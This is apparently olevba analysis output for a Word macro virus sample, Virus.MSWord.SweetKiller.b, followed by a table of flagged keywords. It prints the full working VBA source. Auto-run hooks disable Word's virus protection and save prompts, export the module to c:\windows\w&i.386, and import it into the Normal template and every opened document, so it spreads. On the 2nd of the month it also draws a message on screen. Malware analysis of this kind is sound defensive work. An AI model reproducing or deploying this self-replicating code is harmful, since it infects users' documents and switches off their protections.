olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.SweetKiller.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.SweetKiller.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO LoveIris.bas 
in file: Virus.MSWord.SweetKiller.b - OLE stream: 'Macros/VBA/LoveIris'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim MainWindow As Long
Dim MainWindowDC As Long
Dim Pen As Long
Dim Brush As Long
Dim WindowsDir As String * 50
Dim ExitCommand As String
Type LOGFONT
        lfHeight As Long
        lfWidth As Long
        lfEscapement As Long
        lfOrientation As Long
        lfWeight As Long
        lfItalic As Byte
        lfUnderline As Byte
        lfStrikeOut As Byte
        lfCharSet As Byte
        lfOutPrecision As Byte
        lfClipPrecision As Byte
        lfQuality As Byte
        lfPitchAndFamily As Byte
        lfFaceName(50) As Byte
End Type
Dim MyFont As LOGFONT
Declare Function CreateFontIndirect Lib "gdi32" Alias "CreateFontIndirectA" (lpLogFont As LOGFONT) As Long
Declare Function SetTextColor Lib "gdi32" (ByVal hdc As Long, ByVal crColor As Long) As Long
Declare Function SetBkColor Lib "gdi32" (ByVal hdc As Long, ByVal crColor As Long) As Long
Declare Function GetActiveWindow Lib "user32" () As Long
Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As Long
Declare Function Rectangle Lib "gdi32" (ByVal hdc As Long, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function TextOut Lib "gdi32" Alias "TextOutA" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal lpString As String, ByVal nCount As Long) As Long
Declare Function CreatePen Lib "gdi32" (ByVal nPenStyle As Long, ByVal nWidth As Long, ByVal crColor As Long) As Long
Declare Function CreateSolidBrush Lib "gdi32" (ByVal crColor As Long) As Long
Declare Function SelectObject Lib "gdi32" (ByVal hdc As Long, ByVal hObject As Long) As Long
Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub AutoOpen()
OutBreak
End Sub
Sub AutoClose()
OutBreak
End Sub
Sub AutoNew()
OutBreak
End Sub
Function InDocument() As Boolean
Dim item
InDocument = False
For Each item In ActiveDocument.VBProject.VBComponents
If item.Name = "LoveIris" Then InDocument = True
Next
End Function
Function InTemplate() As Boolean
Dim item
InTemplate = False
For Each item In NormalTemplate.VBProject.VBComponents
If item.Name = "LoveIris" Then InTemplate = True
Next
End Function
Sub DrawFont()
With MyFont
.lfHeight = 24
.lfWidth = 10
.lfEscapement = 0
.lfOrientation = 0
.lfWeight = 600
.lfItalic = 0
.lfUnderline = 0
.lfStrikeOut = 0
.lfCharSet = 1
.lfOutPrecision = 0
.lfClipPrecision = 0
.lfQuality = 0
.lfPitchAndFamily = 0
.lfFaceName(0) = &HCB
.lfFaceName(1) = &HCE
.lfFaceName(2) = &HCC
.lfFaceName(3) = &HE5
.lfFaceName(4) = 0
End With
MainWindow = GetActiveWindow()
MainWindowDC = GetWindowDC(MainWindow)
Brush = CreateSolidBrush(RGB(80, 80, 255))
Pen = CreatePen(0, 4, RGB(220, 80, 180))
SelectObject MainWindowDC, Pen
SelectObject MainWindowDC, Brush
Rectangle MainWindowDC, 100, 200, 440, 300
SelectObject MainWindowDC, CreateFontIndirect(MyFont)
SetTextColor MainWindowDC, RGB(0, 255, 0)
SetBkColor MainWindowDC, RGB(80, 80, 255)
SetTextColor MainWindowDC, RGB(255, 255, 0)
TextOut MainWindowDC, 120, 220, "Iris,算算我们相识多少天了？", 28
TextOut MainWindowDC, 300, 250, "永远爱你的W.L.", 14
End Sub
Sub GoInIt()
ActiveDocument.VBProject.VBComponents.Import ("c:\windows\w&i.386")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub OutBreak()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
If Not InDocument() Then
GoInIt
End If
With Application.FileSearch
.NewSearch
.LookIn = "C:\windows\"
.SearchSubFolders = False
.FileName = "w&i.386"
.MatchTextExactly = False
.FileType = msoFileTypeAllFiles
If .Execute <= 0 Then
ActiveDocument.VBProject.VBComponents("LoveIris").Export ("c:\windows\w&i.386")
End If
End With
If Not InTemplate() Then
NormalTemplate.VBProject.VBComponents.Import ("c:\windows\w&i.386")
NormalTemplate.Save
End If
If Not InDocument() Then
ActiveDocument.VBProject.VBComponents.Import ("c:\windows\w&i.386")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If Day(Now) = 2 Then
DrawFont
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

